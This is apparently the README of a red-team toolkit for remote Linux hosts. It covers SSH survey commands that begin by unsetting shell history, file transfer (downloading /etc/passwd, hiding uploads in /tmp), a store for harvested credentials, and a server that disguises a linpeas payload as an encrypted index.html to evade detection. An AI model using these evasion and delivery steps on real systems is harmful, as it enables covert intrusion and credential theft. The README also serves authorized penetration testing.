# Survey
# Installation 
````
git clone https://github.com/ice-wzl/red-team-tools.git
cd red-team-tools/
pip install requirements.txt
````
# survey.py
## Overview
- Script conducts a hosted based survey on a remote linux system with either a key or a password.  
- Place the commands you want to run in a file or use the one provided.  Ensure commands are seperated with newline
````
cat config.cfg 
unset HISTFILE HISTFILESIZE HISTSIZE PROMPT_COMMAND
id
last
who
ps awwux --forest 
netstat -antpu 
ls -la /var/log
````
## Help
````
python3 survey.py -h
usage: survey.py [-h] [-t TARGET] [-u USERNAME] [-c CONFIG] [-P PORT] (-k KEY | -p PASSWORD)

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
  -u USERNAME, --username USERNAME
  -c CONFIG, --config CONFIG
                        path to config file with commands to run on the remote host seperated by a new line.
  -P PORT, --port PORT  the remote port to connect to
  -k KEY, --key KEY
  -p PASSWORD, --password PASSWORD
````
# transport.py
## Overview
- Script allows for file upload and download to remote host with a password (key option coming soon)
- Script has two help menus, the first one to help you connect to the target, view with `python3 transport.py -h`
````
python3 transport.py -h
usage: transport.py [-h] [-t TARGET] [-P PORT] [-u USERNAME] [-p PASSWORD]

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
  -P PORT, --port PORT
  -u USERNAME, --username USERNAME
  -p PASSWORD, --password PASSWORD
````
- Second help menu is for when you are connected to target, `help`
````
root@10.0.0.5---> help

                exit     --> exit program
                help     --> print this menu
                upload   --> put local file on remote machine
                download --> download remote file to location machine. 
                             save path is your pwd + remote file name 
                lcd      --> change local directory
                lls      --> list current local directory
                cat      --> view file
                pwd      --> see current working directory 
                clear    --> clear screen
````
## How to upload 
````
root@10.0.0.5---> upload
local file to put up: test.txt
remote path for file: /tmp/.hidden.txt
````
## How to download 
````
root@10.0.0.5:# download                                                                                                          
remote file to grab: /etc/passwd
Downloading: [100.0%] [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]  
Download Success /etc/passwd
````
- Verify that your download worked 
- Download will rebuilt the target file system on your local machine 
````
[rocky@rocky red-team-tools]$ tree
.
├── 10.0.0.5
│   └── etc
│       └── passwd
````
- `lls`
````
root@10.0.0.5---> lls .
total 40
drwxrwxr-x. 3 rocky rocky  159 Mar 23 16:48 .
drwxrwxr-x. 3 rocky rocky   44 Mar 23 16:40 ..
-rw-rw-r--. 1 rocky rocky 1790 Mar 23 16:48 passwd
````
- The other commands are common linux commands.
# cred-manager.py 
## Overview 
- Script will manage your credentials for all targets on an engagement.  Ive found this helpful in large enterprises where storing all those key accounts is not practical.
- This helps when you have like 20-50 credentials and you want to keep track of the username, password and ip address of where they came from.
- This is not designed to keep track of 10000 user credentials, unless you want to enter those all in by hand (I do not).
## create
- Creates database and table called `TARGETS`
````
localhost--> create
Table Created
````
## view
- See what is currently saved
````
localhost--> view
Data in Table:
(1, '10.10.10.100', 'Administrator', 'Passw0rd')
(2, '10.10.10.101', 'Ryan', 'Password123!@#')
````
## add
````
localhost--> add
Enter unique ID: 1
Enter IP Address: 10.10.10.100
Enter Username: Administrator
Enter Password: Passw0rd
````
## help
````
localhost--> help
{Create | View | Add | Delete | Exit}
````
## secure-http
- Secure file sharing between your attack box and a victim machine.
- Requires the client to check in with a secret key in order to be able to pull down the hosted file.
- Whatever file you host it will be encrypted and served as `index.html` in order to better blend in with victim machines web traffic 
- It never looks good if a victim machine is attempting to pull down `http://10.10.10.10:80/linpeas.sh`, `http://10.10.10.10:80/index.html` looks better 
- The client will then ask you for the password to decrypt your file and it will save it off to what you specify 
### server.py 
- help
````
python3 server.py -h
usage: server.py [-h] [-i IPADDRESS] [-p PORT] [-f FILE] [-v] [--version]

optional arguments:
  -h, --help            show this help message and exit
  -i IPADDRESS, --ipaddress IPADDRESS
  -p PORT, --port PORT
  -f FILE, --file FILE
  -v, --verbose         Verbosity (-v, -vv, etc)
  --version             show program's version number and exit
````
### client.py 
````
python3 client.py -h
usage: client.py [-h] [-i IPADDRESS] [-p PORT] [-f FILE] [-b BLEND] [-v] [--version]

optional arguments:
  -h, --help            show this help message and exit
  -i IPADDRESS, --ipaddress IPADDRESS
                        The ip address to connect back to
  -p PORT, --port PORT
  -f FILE, --file FILE  The file to pull down, it will be the same as the server.py -f option
  -b BLEND, --blend BLEND
                        Decrypted out file name, make sure to pick something that blends on the target
  -v, --verbose         Verbosity (-v, -vv, etc)
  --version             show program's version number and exit
  ````
  ### Walkthrough 
  - Host the file you want 
  ````
python3 server.py -i 10.0.0.3 -p 8080 -f linpeas.sh
🔨 Server hosting lipeas.sh as index.html at 10.0.0.3 on port 8080 🔨

Run on the client (change the -b option to something that blends): 
python3 client.py -i 10.0.0.3 -p 8080 -f index.html -b decrypted
````
- Now request the file with the provided command 
````
python3 client.py -i 10.0.0.3 -p 8080 -f index.html -b hidden-file
receiving data...
Success
Connection closed

Recieved file with MD5: 8ab5d0c7f44936baadb414ad5435eed1

Enter password for decryption: 
````
- When a valid request comes in the server will show you the password to enter on the client side 
````
python3 server.py -i 10.0.0.3 -p 8080 -f linpeas.sh
🔨 Server hosting linpeas.sh as index.html at 10.0.0.3 on port 8080 🔨

Run on the client (change the -b option to something that blends): 
python3 client.py -i 10.0.0.3 -p 8080 -f index.html -b decrypted

Got connection from ('10.0.0.3', 49510)
Recieved Key: b'wK1NLC7DUO2N73E1AxGE'
Your password to decrypt is: cuHscLbLvTFuyUForQwd
Sent encrypted file with MD5: 8ab5d0c7f44936baadb414ad5435eed1
````
- Once the password is entered the client will tell you the file is decrypted and it will ne named whatever your `-b` parameter was set to 
````
python3 client.py -i 10.0.0.3 -p 8080 -f index.html -b hidden-file
receiving data...
Success
Connection closed

Recieved file with MD5: 8ab5d0c7f44936baadb414ad5435eed1

Enter password for decryption: cuHscLbLvTFuyUForQwd
File Decrypted
````
- The encrypted `index.html`
````
head index.html 
Salted__�Ť2����z7|�7��t�{vu���k��ߝ(*z�	�#��
                                            �c�N�}w{�ISh{�L���W�?�ɾ���t����IpH>��%����~����vG@����Ff"�"���8e,u�2g��X��4:5JO�u�>��{�@'��6�Ȫb��� K�R�y��r���w(��7S1�#myQ���RK-|���H!�ӥ
��
  �����X���뺑;+�\p#�K#AH�������-[��	����u)EU��]�Pi�?���S#dV�E�������Ռ���e�[�9_�yu��+����
````
- The decrypted `linpeas.sh`
````
head hidden-file 
#!/bin/sh

VERSION="ng"
ADVISORY="This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission."
````
## Static Builds
- For target machines that do not have python or libraries use the compiled release of the client
